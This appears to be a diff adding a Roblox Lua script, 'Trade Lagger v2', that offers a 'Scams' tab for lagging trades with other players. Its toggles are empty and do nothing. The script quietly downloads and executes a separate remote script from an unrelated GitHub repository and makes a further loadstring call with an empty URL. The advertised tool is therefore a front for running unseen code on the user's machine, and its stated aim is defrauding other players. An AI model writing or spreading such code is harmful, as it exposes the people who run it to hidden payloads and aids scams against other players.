@@ -1,0 +1,43 @@
+local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
+local Window = OrionLib:MakeWindow({Name = "Trade Lagger v2                                        Dzban#3438", HidePremium = false, SaveConfig = true, ConfigFolder = "OrionTest", IntroEnabled = false})
+loadstring(game:HttpGet(("https://raw.githubusercontent.com/Filsekk/psx_gui_script/main/psx_gui_script.lua")))()
+local Tab = Window:MakeTab({
+	Name = "Scams",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+
+Tab:AddToggle({
+	Name = "Trade Lag",
+	Default = false,
+	Callback = function(Value)
+		
+
+	end    
+})
+
+Tab:AddToggle({
+	Name = "COMING SOON",
+	Default = false,
+	Callback = function(Value)
+		
+
+	end    
+})
+
+local Tab = Window:MakeTab({
+	Name = "Credits",
+	Icon = "rbxassetid://4483345998",
+	PremiumOnly = false
+})
+
+Tab:AddLabel("Dzban#3438 on Discord")
+wait(0)
+loadstring(game:HttpGet"")()
+wait(0)
+OrionLib:MakeNotification({
+	Name = "",
+	Content = "Dzban#3438 on Discord",
+	Image = "",
+	Time = 5
+})
